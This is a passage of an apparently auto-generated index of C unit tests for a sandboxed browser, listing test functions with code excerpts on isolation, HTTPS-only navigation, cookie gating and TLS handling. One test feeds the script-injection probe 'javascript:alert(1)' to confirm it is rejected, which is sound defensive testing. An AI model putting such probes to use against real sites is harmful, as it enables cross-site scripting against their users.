- `test_resolve_absolute_path` (line 377) `static void test_resolve_absolute_path(void **state)`
- `test_resolve_relative_path` (line 389) `static void test_resolve_relative_path(void **state)`
- `test_resolve_null_args` (line 401) `static void test_resolve_null_args(void **state)`
- `test_response_free_on_zeroed` (line 412) `static void test_response_free_on_zeroed(void **state)` - *out, sizeof out), SF_OK); assert_string_equal(out, "https://h.example/foo"); } static void test_resolve_null_args(void **state) { (void)state; char out[256]; assert_int_equal(sf_resolve_redirect(NULL, "/x", out, sizeof out), SF_ERR_NULL_ARG); assert_int_equal(sf_resolve_redirect("https://h/", NULL, out, sizeof out), SF_ERR_NULL_ARG); assert_int_equal(sf_resolve_redirect("https://h/", "/x", NULL, sizeof out), SF_ERR_NULL_ARG); assert_int_equal(sf_resolve_redirect("https://h/", "/x", out, 0), SF_ERR_NULL_ARG); } /* --- memory safety --- (requirement (c))*
- `test_response_free_releases_location` (line 421) `static void test_response_free_releases_location(void **state)`
- `test_get_follow_null_args` (line 435) `static void test_get_follow_null_args(void **state)`
- `test_get_null_args` (line 444) `static void test_get_null_args(void **state)`
- `test_post_null_args` (line 453) `static void test_post_null_args(void **state)`
- `test_cookie_line_matches_pure` (line 479) `static void test_cookie_line_matches_pure(void **state)` - *The URL scheme is validated before any socket is opened, so a downgrade is * rejected without network (Secure by Default: an insecure POST is unrepresentable). static void test_post_rejects_non_https(void **state) { (void)state; sf_config cfg = sf_config_default(); sf_response out; memset(&out, 0, sizeof out); assert_int_equal(sf_post("http://example.com/login", &cfg, "a=b", 3, NULL, &out), SF_ERR_INVALID_URL); assert_int_equal(sf_post("javascript:alert(1)", &cfg, "", 0, NULL, &out), SF_ERR_INVALID_URL); } /* --- session cookie jar (document.cookie bridge for trusted hosts) ---*
- `test_cookie_jar_put_and_header` (line 515) `static void test_cookie_jar_put_and_header(void **state)`
- `main` (line 531) `int main(void)`

#### `test_tab.c`
**Path:** `tests/test_tab.c`

**Functions:**
- `setup_loaded` (line 40) `static int setup_loaded(void **state)`
- `teardown` (line 51) `static int teardown(void **state)`
- `expect_eval` (line 62) `static void expect_eval(tab *t, const char *js, const char *expected)` - *state = f; return 0; } static int teardown(void **state) { fixture *f = (fixture *)*state; if (f != NULL) { tab_close(f->t); free(f); } return 0; } /* Evaluates js and asserts the (non-exception) string result.*
- `test_open_close` (line 72) `static void test_open_close(void **state)` - *return 0; } /* Evaluates js and asserts the (non-exception) string result. static void expect_eval(tab *t, const char *js, const char *expected) { tab_eval_result r; assert_int_equal(tab_eval(t, js, strlen(js), &r), TAB_OK); assert_int_equal(r.is_exception, 0); assert_non_null(r.value); assert_string_equal(r.value, expected); tab_eval_result_free(&r); } /* --- lifecycle ---*
- `test_open_null` (line 82) `static void test_open_null(void **state)`
- `test_load_basic` (line 89) `static void test_load_basic(void **state)` - *tab *t = NULL; assert_int_equal(tab_open(&t), TAB_OK); assert_non_null(t); assert_true(tab_alive(t)); assert_true(tab_child_pid(t) > 0); tab_close(t); } static void test_open_null(void **state) { (void)state; assert_int_equal(tab_open(NULL), TAB_ERR_NULL_ARG); } /* --- load: inert title + text ---*
- `test_load_returns_view_with_link` (line 107) `static void test_load_returns_view_with_link(void **state)` - *The structured display list must survive the IPC round-trip: a heading and a * link with its href arrive intact in p.view.*
- `test_load_returns_image_run` (line 134) `static void test_load_returns_image_run(void **state)` - *An <img> must survive the IPC round-trip as a PV_IMAGE run carrying its src, * alt text, and declared dimensions (so render_policy can later gate it).*
- `test_load_carries_author_color` (line 165) `static void test_load_carries_author_color(void **state)` - *An author color extracted in the confined child must survive the IPC round-trip * as the run's fg_rgb (so the parent can apply it once CSS is enabled).*
- `test_load_carries_flex_item` (line 192) `static void test_load_carries_flex_item(void **state)` - *Stage 3: the per-item flex values resolved by the worker must survive the IPC * round-trip (write_view/read_view), so the GUI's flex layout can honor them.*
- `test_load_carries_flex_wrap_align_row_gap` (line 236) `static void test_load_carries_flex_wrap_align_row_gap(void **state)` - *flex-wrap / row-gap / align-items (CONTAINER) + align-self (ITEM) survive the worker round-trip (write_view/read_view serialize the 4 new fields in the same * order on both sides).*
- `test_load_carries_float` (line 276) `static void test_load_carries_float(void **state)` - *float.md over IPC: float_side/float_id/float_clear survive the worker round-trip * (write_view/read_view serialize them in the same order on both sides).*
- `test_load_carries_visibility_overflow_cursor_and_text_wrap` (line 319) `static void test_load_carries_visibility_overflow_cursor_and_text_wrap(void **state)` - *visibility/overflow/cursor (box-level) and text-overflow/word-break (run-level) survive the worker round-trip -- write_view/read_view serialize the box-def f[] * array and the per-run tail in the same order on both sides.*
- `test_load_carries_node_id` (line 403) `static void test_load_carries_node_id(void **state)` - *Stage 0 keystone: the document-order element id assigned by the child must survive the IPC round-trip, so the parent can map a painted block back to the * worker's live DOM node.*
- `test_click_runs_handler_and_returns_view` (line 437) `static void test_click_runs_handler_and_returns_view(void **state)` - *Stage 4 dispatcher: a click on a node with a JS handler mutates the DOM, and the * new view is returned over IPC with the mutation reflected.*
- `test_event_ipc_via_tab_eval` (line 475) `static void test_event_ipc_via_tab_eval(void **state)`
- `test_mouse_ipc_round_trip` (line 531) `static void test_mouse_ipc_round_trip(void **state)` - *Dispatches a mouse event (mouseover) via tab_dispatch_mouse and verifies the * handler fires and mutates the DOM. Covers the IPC round-trip.*
- `test_focus_ipc_round_trip` (line 576) `static void test_focus_ipc_round_trip(void **state)` - *Dispatches a focus event via tab_dispatch_event (OP_EVENT path) and verifies * the handler fires and mutates the DOM. Covers focus/blur/scroll via IPC.*
- `test_tick_fires_delayed_timer` (line 623) `static void test_tick_fires_delayed_timer(void **state)` - *Real async timers (2026-07-11): a setTimeout with a delay does NOT fire on the load pump; the load response reports the smallest pending delay; tab_tick advances the virtual clock, fires it, and the refreshed view shows the * mutation. Intervals re-arm (next_timer_ms stays set).*
- `test_tick_interval_rearms` (line 659) `static void test_tick_interval_rearms(void **state)`
- `test_load_carries_box_decoration` (line 690) `static void test_load_carries_box_decoration(void **state)` - *Box-engine identity + decoration resolved in the confined child must survive the * IPC round-trip (write_view/read_view symmetry for the new fields).*
- `test_load_carries_box_tree` (line 726) `static void test_load_carries_box_tree(void **state)` - *The box TREE (Step D) — the box-definition list with its parent links — must survive the IPC round-trip: a nested box parsed in the confined child arrives with * its decoration on the box def and its parent_id pointing at the outer box.*
- `test_load_strips_script` (line 805) `static void test_load_strips_script(void **state)`
- `test_load_no_session_cookies_when_untrusted` (line 876) `static void test_load_no_session_cookies_when_untrusted(void **state)` - *Untrusted host (net off): the cookie jar stays disabled -- document.cookie is '' even * if the parent were to seed it, and nothing is dumped back (Zero Knowledge default).*
- `test_load_ex_builds_dom_and_fires_onload` (line 898) `static void test_load_ex_builds_dom_and_fires_onload(void **state)` - *Live JS construction (Hito 20c): a script builds a node and an onload handler * mutates it; both must be reflected in the worker's returned view.*
- `test_load_ex_inner_html_renders` (line 926) `static void test_load_ex_inner_html_renders(void **state)` - *innerHTML (Hito 20d): a script replaces a container's markup; the parsed content * renders, and ephemeral storage / empty cookie do not break the script.*
- `console_find` (line 977) `static const fb_entry *console_find(const fb_buffer *log, int level, const char *needle)` - *assert_int_equal(tab_load(t, H, sizeof H - 1, &p), TAB_OK); assert_non_null(p.title); assert_string_equal(p.title, "Old"); int saw_before = 0; for (size_t i = 0; i < pv_count(p.view); ++i) { const char *txt = pv_at(p.view, i)->text; if (txt != NULL && strcmp(txt, "before") == 0) saw_before = 1; } assert_true(saw_before); tab_page_free(&p); tab_close(t); } /* Finds a console entry at the given level whose text contains needle.*
- `test_load_captures_console_and_error` (line 987) `static void test_load_captures_console_and_error(void **state)` - *Freebug (FB-1): with run_js, the page's console.* output and any uncaught script * error are captured and delivered to the parent in tab_page.console.*
- `test_load_isolates_script_errors` (line 1014) `static void test_load_isolates_script_errors(void **state)` - *Per-script isolation (browser semantics): an uncaught error in the FIRST inline <script> must NOT abort later scripts. Before this, all scripts were concatenated into one eval, so the first throw killed every following script -- the root cause of "loads nothing" on script-heavy pages (e.g. google.com). The first script's * error is still surfaced to the console; the second script still mutates the title.*
- `test_load_error_carries_location` (line 1042) `static void test_load_error_carries_location(void **state)` - *FB error locations (Hito 24): an uncaught error reports the inline script name ("inline #N") plus the line and column of its throw site, carried across the IPC pipe into tab_page.console. The 2nd inline script throws on its 2nd line so a * non-trivial line number is asserted.*
- `test_load_element_wrapper_idioms` (line 1068) `static void test_load_element_wrapper_idioms(void **state)` - *Element-wrapper completeness (Hito 24): the exact google.com startup idioms that previously threw -- dataset.X, hasAttribute, removeAttribute, src.substring -- now * run clean end-to-end through the worker. Title is set only if all four succeed.*
- `test_load_document_fonts_stub` (line 1098) `static void test_load_document_fonts_stub(void **state)` - *document.fonts stub: a feature-detecting script that calls document.fonts.load()/ .check() must not throw (this exact call -- document.fonts.load -- is what produced * google.com's "cannot read property 'load' of undefined"). The stub is benign.*
- `test_load_without_js_has_empty_console` (line 1118) `static void test_load_without_js_has_empty_console(void **state)` - *"</script></body></html>"; tab *t = NULL; assert_int_equal(tab_open(&t), TAB_OK); tab_page p; assert_int_equal(tab_load_ex(t, H, sizeof H - 1, 1, &p), TAB_OK); /* No uncaught error, and the script ran to completion. assert_int_equal((int)fb_buffer_count(&p.console), 0); assert_non_null(p.title); assert_string_equal(p.title, "FONTS_OK"); tab_page_free(&p); tab_close(t); } /* Freebug (FB-1): a no-JS load runs no scripts, so the console is empty.*
- `test_eval_captures_console_output` (line 1134) `static void test_eval_captures_console_output(void **state)` - *Freebug (FB-1): the REPL (tab_eval) returns the value AND the console output the * evaluation produced, each eval reporting only its own transcript.*
- `test_load_full_location_is_real` (line 1163) `static void test_load_full_location_is_real(void **state)` - *Real location (Hito 20e): the page URL passed to tab_load_full backs a real * location object the page's JS can read (no scripts need run for the read).*
- `test_js_navigation_relative_resolved` (line 1199) `static void test_js_navigation_relative_resolved(void **state)`
- `test_js_navigation_unsafe_is_blocked` (line 1219) `static void test_js_navigation_unsafe_is_blocked(void **state)` - *Fail-closed gate: the parent rejects a downgrade / foreign-scheme / fragment nav, * so a hostile or compromised worker cannot drive the browser off-policy.*
- `test_no_js_no_navigation` (line 1241) `static void test_no_js_no_navigation(void **state)` - *const char *cases[] = { DOWNGRADE, FOREIGN, FRAGMENT }; for (size_t i = 0; i < 3; ++i) { tab *t = NULL; assert_int_equal(tab_open(&t), TAB_OK); tab_page p; assert_int_equal(tab_load_full(t, cases[i], strlen(cases[i]), "https://example.com/", 1, 0, 0, &p), TAB_OK); assert_true(p.nav_url == NULL || p.nav_url[0] == '\0'); /* no navigation tab_page_free(&p); tab_close(t); } } /* With JS off the navigating script never runs: no nav request (Secure by Default).*
- `test_load_null_and_too_large` (line 1254) `static void test_load_null_and_too_large(void **state)`
- `test_eval_sees_dom` (line 1270) `static void test_eval_sees_dom(void **state)` - *(void)state; tab *t = NULL; assert_int_equal(tab_open(&t), TAB_OK); tab_page p; assert_int_equal(tab_load(NULL, HTML, 4, &p), TAB_ERR_NULL_ARG); assert_int_equal(tab_load(t, HTML, 4, NULL), TAB_ERR_NULL_ARG); assert_int_equal(tab_load(t, NULL, 4, &p), TAB_ERR_NULL_ARG); /* Length cap checked in the parent before any IPC; child stays alive. assert_int_equal(tab_load(t, "x", TAB_MAX_INPUT + 1, &p), TAB_ERR_TOO_LARGE); assert_true(tab_alive(t)); tab_close(t); } /* --- eval: sees the DOM bound in the child ---*
- `test_eval_sees_env` (line 1280) `static void test_eval_sees_env(void **state)` - *tab_close(t); } /* --- eval: sees the DOM bound in the child --- static void test_eval_sees_dom(void **state) { fixture *f = (fixture *)*state; expect_eval(f->t, "dom.nodeCount() > 0", "true"); expect_eval(f->t, "dom.getElementById('main') !== null", "true"); expect_eval(f->t, "dom.tagName(dom.getElementById('main'))", "div"); expect_eval(f->t, "dom.getAttribute(dom.getElementById('main'),'class')", "box"); } /* --- eval: sees the normalized anti-fp environment ---*
- `test_eval_no_network_or_cross_origin_api` (line 1298) `static void test_eval_no_network_or_cross_origin_api(void **state)` - *SOP/CORS confidentiality (gap audit #2): the JS sandbox exposes NO way to make a network request or open a cross-origin browsing context, so it can never READ cross-origin data -- the canonical CORS threat (reading a cross-origin response) is structurally absent, on top of the worker having no network at all (CLONE_NEWNET + seccomp blocks socket/connect). document.cookie is present but empty (Zero Knowledge), so there is nothing to exfiltrate even via the page's own loads. If a future change adds a fetch-like API, this test fires and forces same-origin/CORS * enforcement to be added alongside it.*
- `stub_fetch` (line 1317) `static int stub_fetch(void *ctx, const char *method, const char *url,
                      const...` - *Stub parent fetcher: returns a fixed 200/"PONG" body, but REFUSES any "blocked.example" * host -- standing in for the real parent's hostblock/realm/TLS policy.*
- `test_xhr_works_when_net_allowed` (line 1336) `static void test_xhr_works_when_net_allowed(void **state)` - *With net allowed (host in allow.conf AND js.conf) the page's XHR reaches the parent * fetcher and the response is visible to script.*
- `test_xhr_undefined_when_net_not_allowed` (line 1356) `static void test_xhr_undefined_when_net_not_allowed(void **state)` - *Default (net not allowed): XHR/fetch stay undefined -- Same-Origin-by-construction holds for every site not in BOTH lists. The script's `new XMLHttpRequest` throws, so the title * is never reassigned.*
- `stub_script_fetch` (line 1395) `static int stub_script_fetch(void *ctx, const char *method, const char *url,
                    ...` - *Stub parent fetcher for external scripts: serves JS bodies by URL with a proper JavaScript Content-Type; refuses "blocked.example" (standing in for the parent's * policy) and serves one URL with a NON-JS Content-Type (type-confusion guard).*
- `test_external_script_executes_when_net_allowed` (line 1425) `static void test_external_script_executes_when_net_allowed(void **state)` - *With net granted (allow.conf AND js.conf) an external script's bytes come from the * trusted parent and execute: its DOM mutation is visible in the page result.*
- `test_external_script_document_order` (line 1442) `static void test_external_script_document_order(void **state)` - *External scripts execute IN DOCUMENT ORDER interleaved with inline ones: a later * inline script sees the external script's effects (exactly as a browser).*
- `test_external_script_skipped_without_net` (line 1465) `static void test_external_script_skipped_without_net(void **state)` - *Without the network grant an external script is SKIPPED (never fetched, never run): the page still loads and a Freebug warn entry records the skip. The "external src * never runs" doctrine still holds for every host not in BOTH lists.*
- `test_external_script_bad_ctype_not_executed` (line 1489) `static void test_external_script_bad_ctype_not_executed(void **state)` - *A response that is not JavaScript (e.g. an HTML error page) is NOT executed * (type-confusion guard, fail closed); the page still loads.*
- `test_external_script_blocked_host_refused` (line 1506) `static void test_external_script_blocked_host_refused(void **state)` - *Even with net granted, the trusted parent's refusal (blocked host) means the script * never runs -- the gate is the PARENT's policy, not the page's.*
- `stub_css_fetch` (line 1529) `static int stub_css_fetch(void *ctx, const char *method, const char *url,
                       ...` - *Stub parent fetcher for stylesheets: serves CSS bodies by URL with a text/css Content-Type; refuses "blocked.example" (standing in for the parent's policy) and * serves one URL with a NON-CSS Content-Type (type-confusion guard).*
- `view_find_text` (line 1550) `static const pv_run *view_find_text(const pv_view *v, const char *needle)`
- `test_external_css_applied_when_allowed` (line 1562) `static void test_external_css_applied_when_allowed(void **state)` - *With the css grant, the <link rel=stylesheet> bytes come from the trusted parent * and feed the author-CSS cascade -- no JS required (run_js == 0).*
- `test_external_css_skipped_without_grant` (line 1582) `static void test_external_css_skipped_without_grant(void **state)` - *Default (no grant): zero subresource requests and no external styling -- * Privacy by Default holds, byte-identical to the pre-Hito-27 view.*
- `test_external_css_bad_ctype_not_parsed` (line 1601) `static void test_external_css_bad_ctype_not_parsed(void **state)` - *A non-CSS Content-Type (an HTML 404 page, a script) is never parsed as a sheet * (anti type-confusion, fail closed); the load continues unstyled.*
- `test_external_css_blocked_host_refused` (line 1619) `static void test_external_css_blocked_host_refused(void **state)` - *The parent's policy refusal (blocked host) degrades to "no sheet", never a * failed load: presentation is fail-open like hostblock, the page stays usable.*
- `test_external_css_survives_click_rederive` (line 1637) `static void test_external_css_survives_click_rederive(void **state)` - *The fetched sheet PERSISTS in the worker: a click re-derives the view (OP_CLICK) * and the styling survives without a re-fetch.*
- `test_subreq_permitted_pure` (line 1665) `static void test_subreq_permitted_pure(void **state)` - *Pure parent-side subresource gate (Zero Trust: the parent decides from ITS flags, never the worker's): net grants any well-formed method, css-only grants exactly * "GET", nothing granted (or a malformed method) is refused.*
- `read` (line 1686) `* vector no page may read (Zero Knowledge). Google's real JS hit exactly this. */
static void tes...`
- `test_eval_exception` (line 1706) `static void test_eval_exception(void **state)` - *"<!DOCTYPE html><html><head><title>x</title></head><body>" "<script>document.title = 'tz:' + new Date(0).getTimezoneOffset()" " + ':' + new Date(1e12).getTimezoneOffset();</script>" "</body></html>"; tab_page p; assert_int_equal(tab_load_full(t, H, sizeof H - 1, "https://site.test/", 1, 0, 0, &p), TAB_OK); assert_non_null(p.title); assert_string_equal(p.title, "tz:0:0");    /* UTC, and the worker lived to say so tab_page_free(&p); assert_int_not_equal(tab_alive(t), 0); tab_close(t); } /* --- eval: a JS exception is TAB_OK with is_exception set, not a worker error ---*
- `test_eval_persistent_state` (line 1718) `static void test_eval_persistent_state(void **state)` - */* --- eval: a JS exception is TAB_OK with is_exception set, not a worker error --- static void test_eval_exception(void **state) { fixture *f = (fixture *)*state; tab_eval_result r; assert_int_equal(tab_eval(f->t, "throw new Error('boom')", 23, &r), TAB_OK); assert_int_not_equal(r.is_exception, 0); assert_non_null(r.value); assert_non_null(strstr(r.value, "boom")); tab_eval_result_free(&r); } /* --- eval: state persists across calls within the same worker ---*
- `test_reload_replaces_page` (line 1727) `static void test_reload_replaces_page(void **state)` - *assert_non_null(strstr(r.value, "boom")); tab_eval_result_free(&r); } /* --- eval: state persists across calls within the same worker --- static void test_eval_persistent_state(void **state) { fixture *f = (fixture *)*state; expect_eval(f->t, "globalThis.counter = 41", "41"); expect_eval(f->t, "++globalThis.counter", "42"); expect_eval(f->t, "globalThis.counter", "42"); } /* --- a second load replaces the page; eval sees the new DOM ---*
- `test_eval_without_load` (line 1751) `static void test_eval_without_load(void **state)` - *static const char HTML2[] = "<!DOCTYPE html><html><head><title>Second</title></head>" "<body><span id=\"other\">x</span></body></html>"; assert_int_equal(tab_load(t, HTML2, sizeof HTML2 - 1, &p), TAB_OK); assert_string_equal(p.title, "Second"); tab_page_free(&p); expect_eval(t, "dom.getElementById('other') !== null", "true"); expect_eval(t, "dom.getElementById('main') === null", "true"); /* old node gone tab_close(t); } /* --- eval before any load is a worker error, not a crash ---*
- `test_binary_does_not_crash_parent` (line 1763) `static void test_binary_does_not_crash_parent(void **state)` - */* --- eval before any load is a worker error, not a crash --- static void test_eval_without_load(void **state) { (void)state; tab *t = NULL; assert_int_equal(tab_open(&t), TAB_OK); tab_eval_result r; assert_int_equal(tab_eval(t, "1+1", 3, &r), TAB_ERR_SCRIPT); assert_true(tab_alive(t)); tab_close(t); } /* --- the parent must survive arbitrary/binary input: isolation in action ---*
- `test_child_death_survived` (line 1778) `static void test_child_death_survived(void **state)` - *static void test_binary_does_not_crash_parent(void **state) { (void)state; tab *t = NULL; assert_int_equal(tab_open(&t), TAB_OK); uint8_t junk[1024]; for (size_t i = 0; i < sizeof junk; ++i) junk[i] = (uint8_t)(i * 37 + 11); tab_page p; tab_status s = tab_load(t, (const char *)junk, sizeof junk, &p); assert_true(s == TAB_OK || s == TAB_ERR_RENDER || s == TAB_ERR_DEAD); tab_page_free(&p); tab_close(t); } /* --- killing the child: the parent survives, reports TAB_ERR_DEAD ---*
- `test_free_null_and_double` (line 1804) `static void test_free_null_and_double(void **state)` - */* Give the kernel a moment to deliver the signal and reap-on-read. struct timespec ts = { 0, 50 * 1000 * 1000 }; nanosleep(&ts, NULL); tab_eval_result r; tab_status s = tab_eval(t, "1+1", 3, &r); assert_int_equal(s, TAB_ERR_DEAD); /* parent did not die with the child tab_eval_result_free(&r); assert_false(tab_alive(t)); tab_close(t); } /* --- releasers are NULL-safe and idempotent ---*
- `test_decode_image_in_sandbox` (line 1838) `static void test_decode_image_in_sandbox(void **state)`
- `test_decode_image_rejects_junk` (line 1860) `static void test_decode_image_rejects_junk(void **state)`
- `test_decode_image_null_args` (line 1875) `static void test_decode_image_null_args(void **state)`
- `test_decode_image_data_url_in_sandbox` (line 1894) `static void test_decode_image_data_url_in_sandbox(void **state)`
- `test_decode_image_data_url_null_args` (line 1936) `static void test_decode_image_data_url_null_args(void **state)`
- `test_worker_args_valid` (line 1949) `static void test_worker_args_valid(void **state)` - *} static void test_decode_image_data_url_null_args(void **state) { (void)state; tab *t = NULL; assert_int_equal(tab_open(&t), TAB_OK); tab_image img; assert_int_equal(tab_decode_image_data_url(t, NULL, &img), TAB_ERR_NULL_ARG); assert_int_equal(tab_decode_image_data_url(NULL, PNG_DATA_URL, &img), TAB_ERR_NULL_ARG); assert_int_equal(tab_decode_image_data_url(t, PNG_DATA_URL, NULL), TAB_ERR_NULL_ARG); tab_close(t); } /* --- pure: worker-handoff argument validation (the exec security surface) ---*
- `test_worker_args_not_worker` (line 1958) `static void test_worker_args_not_worker(void **state)`
- `test_worker_args_malformed` (line 1965) `static void test_worker_args_malformed(void **state)`
- `test_worker_args_null_safe` (line 1980) `static void test_worker_args_null_safe(void **state)`
- `test_load_view_codec_full_roundtrip` (line 1997) `static void test_load_view_codec_full_roundtrip(void **state)` - *M0.2 codec golden: one load packs a broad spread of run + box fields across BOTH fixed-width run blocks (block A: image/color/text-presentation/container; block B: flex/box-model/input) and the box-def array, with distinctive numeric values. A wire desync in write_view/read_view (a swapped or dropped field) surfaces here as a value read into the wrong slot. Locks the bulk-array refactor: it passes identically before * and after, because the wire bytes are unchanged.*
- `main` (line 2095) `int main(int argc, char **argv)`

**Macros:**
- `_POSIX_C_SOURCE` (line 13)
- `XHR_PAGE` (line 1328)
- `EXT_PAGE` (line 1418)
- `CSS_PAGE` (line 1545)

**Structs:**
- `fixture` (line 39)

#### `test_text_shape.c`
**Path:** `tests/test_text_shape.c`

**Functions:**
- `test_null_and_bad_inputs` (line 26) `static void test_null_and_bad_inputs(void **state)` - *#include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <math.h> #include <string.h> #include <cmocka.h> #include "text_shape.h" #include "css.h" static const tsh_font SANS = { .family = CSS_FF_SANS, .bold = 0, .italic = 0 }; /* --- fail-closed input contract (no font needed) ---*
- `test_empty_slice_is_ok` (line 56) `static void test_empty_slice_is_ok(void **state)`
- `test_shape_ascii` (line 69) `static void test_shape_ascii(void **state)` - *} static void test_empty_slice_is_ok(void **state) { (void)state; cairo_glyph_t g[8]; size_t n = 99; double adv = 99.0; /* Empty input is OK regardless of backend: nothing to shape. assert_int_equal(tsh_shape(&SANS, 16.0, "", 0, g, 8, &n, &adv), TSH_OK); assert_int_equal((int)n, 0); assert_true(adv == 0.0); assert_true(tsh_measure(&SANS, 16.0, "", 0) == 0.0); } /* --- shaping invariants (real font path; fallback contract otherwise) ---*
- `test_determinism` (line 91) `static void test_determinism(void **state)`
- `test_measure_matches_shape` (line 107) `static void test_measure_matches_shape(void **state)`
- `test_overflow_cap` (line 119) `static void test_overflow_cap(void **state)`
- `test_draw_paints` (line 129) `static void test_draw_paints(void **state)`
- `teardown` (line 142) `static int teardown(void **state)`
- `main` (line 148) `int main(void)`

#### `test_textfield.c`
**Path:** `tests/test_textfield.c`

**Functions:**
- `test_init_and_accessors` (line 19) `static void test_init_and_accessors(void **state)` - *include "textfield.h"*
- `test_null_safe` (line 28) `static void test_null_safe(void **state)`
- `test_set` (line 45) `static void test_set(void **state)`
- `test_insert_sequence` (line 58) `static void test_insert_sequence(void **state)`
- `test_backspace_delete` (line 75) `static void test_backspace_delete(void **state)`
- `test_move_saturates` (line 99) `static void test_move_saturates(void **state)`
- `test_full_fails_closed` (line 112) `static void test_full_fails_closed(void **state)`
- `main` (line 139) `int main(void)`

#### `test_tls_impersonate.c`
**Path:** `tests/test_tls_impersonate.c`

**Functions:**
- `test_gate_requires_all_three_signals` (line 21) `static void test_gate_requires_all_three_signals(void **state)` - *#include <setjmp.h> #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <string.h> #include <stdlib.h> #include <cmocka.h> #include "tls_impersonate.h" /* --- the triple gate: 1 IFF all three signals set (fail-closed otherwise) ---*
- `test_encode_decode_req_roundtrip` (line 38) `static void test_encode_decode_req_roundtrip(void **state)` - *assert_int_equal(ti_should_impersonate(1, 1, 1), 1); /* any single missing signal fails closed assert_int_equal(ti_should_impersonate(0, 1, 1), 0); assert_int_equal(ti_should_impersonate(1, 0, 1), 0); assert_int_equal(ti_should_impersonate(1, 1, 0), 0); /* two or three missing assert_int_equal(ti_should_impersonate(1, 0, 0), 0); assert_int_equal(ti_should_impersonate(0, 0, 0), 0); /* non-1 truthy values still gate correctly (normalized booleans) assert_int_equal(ti_should_impersonate(7, 3, 9), 1); assert_int_equal(ti_should_impersonate(7, 3, 0), 0); } /* --- request codec round-trip ---*
- `test_encode_decode_req_empty_body` (line 64) `static void test_encode_decode_req_empty_body(void **state)`
- `test_encode_decode_resp_roundtrip` (line 88) `static void test_encode_decode_resp_roundtrip(void **state)` - *}; uint8_t buf[1024]; size_t n = ti_encode_req(&in, buf, sizeof buf); assert_true(n > 0); ti_req out; assert_int_equal(ti_decode_req(buf, n, &out), 0); assert_string_equal(out.url, in.url); assert_string_equal(out.method, in.method); assert_string_equal(out.headers, ""); assert_int_equal((int)out.body_len, 0); ti_req_free(&out); } /* --- response codec round-trip (carries the chain + negotiated group) ---*
- `test_resp_no_chain_ok` (line 120) `static void test_resp_no_chain_ok(void **state)`
- `test_decode_rejects_truncated` (line 143) `static void test_decode_rejects_truncated(void **state)` - *}; in.negotiated_group[0] = '\0'; uint8_t buf[256]; size_t n = ti_encode_resp(&in, buf, sizeof buf); assert_true(n > 0); ti_resp out; assert_int_equal(ti_decode_resp(buf, n, &out), 0); assert_int_equal((int)out.status, 0); assert_null(out.peer_chain_der); assert_int_equal((int)out.peer_chain_len, 0); ti_resp_free(&out); } /* --- fail-closed: truncated / malformed frames are rejected, never overrun ---*
- `test_decode_rejects_bad_magic` (line 162) `static void test_decode_rejects_bad_magic(void **state)`
- `test_decode_rejects_overlong_field` (line 176) `static void test_decode_rejects_overlong_field(void **state)`
- `test_encode_fails_when_no_room` (line 191) `static void test_encode_fails_when_no_room(void **state)`
- `test_encode_rejects_oversize_url` (line 202) `static void test_encode_rejects_oversize_url(void **state)`
- `main` (line 217) `int main(void)`

#### `test_ui.c`
**Path:** `tests/test_ui.c`

**Functions:**
- `assert_line` (line 20) `static void assert_line(const char *text, const ui_layout *lay, size_t n,
                       ...` - *Build: make test   ;   ASan: make asan  #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <setjmp.h> #include <string.h> #include <cmocka.h> #include "ui.h" /* Asserts that line `n` of the layout equals expected (over the source text).*
- `test_wrap_null_args` (line 27) `static void test_wrap_null_args(void **state)`
- `test_wrap_empty` (line 34) `static void test_wrap_empty(void **state)`
- `test_wrap_short_single_line` (line 42) `static void test_wrap_short_single_line(void **state)`
- `test_wrap_breaks_at_space` (line 52) `static void test_wrap_breaks_at_space(void **state)`
- `test_wrap_hard_breaks_long_word` (line 63) `static void test_wrap_hard_breaks_long_word(void **state)`
- `test_wrap_does_not_split_utf8` (line 75) `static void test_wrap_does_not_split_utf8(void **state)`
- `test_wrap_respects_newline` (line 89) `static void test_wrap_respects_newline(void **state)`
- `test_wrap_zero_cols_is_sanitised` (line 100) `static void test_wrap_zero_cols_is_sanitised(void **state)`
- `test_clamp_scroll` (line 112) `static void test_clamp_scroll(void **state)`
- `test_layout_free_null_and_double` (line 120) `static void test_layout_free_null_and_double(void **state)`
- `main` (line 129) `int main(void)`

#### `test_url.c`
**Path:** `tests/test_url.c`

**Functions:**
- `test_is_https` (line 22) `static void test_is_https(void **state)` - *#include <setjmp.h> #include <stdarg.h> #include <stddef.h> #include <stdint.h> #include <stdlib.h> #include <string.h> #include <cmocka.h> #include "url.h" /* --- url_is_https / url_validate_https ---*
- `test_validate_https` (line 35) `static void test_validate_https(void **state)`
- `test_validate_long_bundle_url` (line 49) `static void test_validate_long_bundle_url(void **state)` - *Modern bundle URLs exceed 2048 bytes (google.com's xjs script URL measures 3456): * anything within URL_MAX_LEN must validate and resolve; far past it fails closed.*
- `test_has_scheme` (line 68) `static void test_has_scheme(void **state)` - *memset(url + base, 'a', 4000 - base); url[4000] = '\0'; assert_int_equal(url_validate_https(url), URL_OK); char out[URL_MAX_LEN + 1]; assert_int_equal(url_resolve_https("https://e.example/page", url + base - 1, out, sizeof out), URL_OK); memset(url + base, 'a', (URL_MAX_LEN + 100) - base); url[URL_MAX_LEN + 100] = '\0'; assert_true(url_validate_https(url) != URL_OK);   /* past the cap: fail closed } /* --- url_has_scheme ---*
- `test_authority_len` (line 85) `static void test_authority_len(void **state)` - *assert_int_equal(url_has_scheme("https://x"), 1); assert_int_equal(url_has_scheme("mailto:a@b"), 1); assert_int_equal(url_has_scheme("javascript:void(0)"), 1); assert_int_equal(url_has_scheme("a+b-c.d:x"), 1); assert_int_equal(url_has_scheme("//host/path"), 0); assert_int_equal(url_has_scheme("/abs/path"), 0); assert_int_equal(url_has_scheme("relative/path"), 0); assert_int_equal(url_has_scheme("#fragment"), 0); assert_int_equal(url_has_scheme("?query"), 0); assert_int_equal(url_has_scheme("3com:x"), 0); /* scheme must start with ALPHA assert_int_equal(url_has_scheme(NULL), 0); } /* --- url_authority_len ---*
- `test_remove_dot_segments` (line 94) `static void test_remove_dot_segments(void **state)` - *assert_int_equal(url_has_scheme("3com:x"), 0); /* scheme must start with ALPHA assert_int_equal(url_has_scheme(NULL), 0); } /* --- url_authority_len --- static void test_authority_len(void **state) { (void)state; assert_int_equal((int)url_authority_len("https://h.example"), 17); assert_int_equal((int)url_authority_len("https://h.example/a/b"), 17); assert_int_equal((int)url_authority_len("https://h.example:8443/x"), 22); } /* --- url_remove_dot_segments ---*
